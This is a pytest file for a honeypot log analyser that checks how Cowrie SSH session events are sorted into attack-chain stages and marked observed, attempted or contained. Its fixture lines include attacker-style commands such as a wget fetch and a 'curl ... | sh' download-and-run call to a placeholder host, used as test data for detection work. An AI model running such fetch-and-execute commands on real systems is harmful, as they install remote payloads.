from pathlib import Path

from sqlalchemy.orm import sessionmaker

from honeynet.attack_chain import analyze_attack_chain
from honeynet.cowrie import normalize_lines
from honeynet.database import Base, build_engine
from honeynet.repository import EventRepository

FIXTURE = Path(__file__).parents[1] / "fixtures" / "cowrie_session_intelligence.jsonl"


def test_attack_chain_separates_observation_intent_and_containment(tmp_path: Path) -> None:
    engine = build_engine(f"sqlite:///{tmp_path / 'attack-chain.db'}")
    Base.metadata.create_all(engine)
    local_session = sessionmaker(bind=engine, expire_on_commit=False)
    with FIXTURE.open(encoding="utf-8") as stream:
        normalized = list(normalize_lines(stream))
    with local_session() as session:
        EventRepository(session).add_many(normalized)
        stored = EventRepository(session).session_events("cowrie-intelligence-001")

    chain = analyze_attack_chain(stored)
    by_category = {stage.category: stage for stage in chain}

    assert [stage.category for stage in chain] == [
        "access",
        "discovery",
        "staging",
        "transfer",
        "execution",
        "cleanup",
    ]
    assert by_category["access"].status == "observed"
    assert by_category["staging"].status == "observed"
    assert by_category["transfer"].status == "contained"
    assert by_category["execution"].status == "contained"
    assert by_category["cleanup"].status == "attempted"
    assert "uruchomienia procesu" in by_category["execution"].summary


def test_transfer_command_alone_is_only_an_attempt(tmp_path: Path) -> None:
    engine = build_engine(f"sqlite:///{tmp_path / 'attempt.db'}")
    Base.metadata.create_all(engine)
    local_session = sessionmaker(bind=engine, expire_on_commit=False)
    lines = [
        (
            '{"eventid":"cowrie.command.input","sensor":"pl-lab-01",'
            '"timestamp":"2026-08-26T10:00:00Z","session":"attempt-only",'
            '"src_ip":"192.0.2.1","input":"wget https://payload.invalid/a"}'
        )
    ]
    with local_session() as session:
        EventRepository(session).add_many(normalize_lines(lines))
        stored = EventRepository(session).session_events("attempt-only")

    chain = analyze_attack_chain(stored)

    assert len(chain) == 1
    assert chain[0].category == "transfer"
    assert chain[0].status == "attempted"


def test_simulated_transfer_is_contained_and_never_claimed_as_downloaded(
    tmp_path: Path,
) -> None:
    engine = build_engine(f"sqlite:///{tmp_path / 'simulated.db'}")
    Base.metadata.create_all(engine)
    local_session = sessionmaker(bind=engine, expire_on_commit=False)
    lines = [
        (
            '{"eventid":"cowrie.command.input","sensor":"pl-lab-01",'
            '"timestamp":"2026-08-28T12:00:03Z","session":"simulated",'
            '"src_ip":"192.0.2.44","input":"curl -fsSL '
            'https://payload.invalid/stage.sh | sh; echo CONTINUED"}'
        ),
        (
            '{"eventid":"cowrie.session.file_download.simulated",'
            '"sensor":"pl-lab-01","timestamp":"2026-08-28T12:00:04Z",'
            '"session":"simulated","src_ip":"192.0.2.44","tool":"wget",'
            '"url":"https://payload.invalid/stage.sh","outfile":"/tmp/stage.sh"}'
        )
    ]
    with local_session() as session:
        EventRepository(session).add_many(normalize_lines(lines))
        stored = EventRepository(session).session_events("simulated")

    chain = analyze_attack_chain(stored)

    by_category = {stage.category: stage for stage in chain}
    assert by_category["transfer"].status == "contained"
    assert "bez pobierania danych" in by_category["transfer"].summary
    assert by_category["execution"].status == "contained"
    assert "nie został pobrany ani wykonany" in by_category["execution"].summary
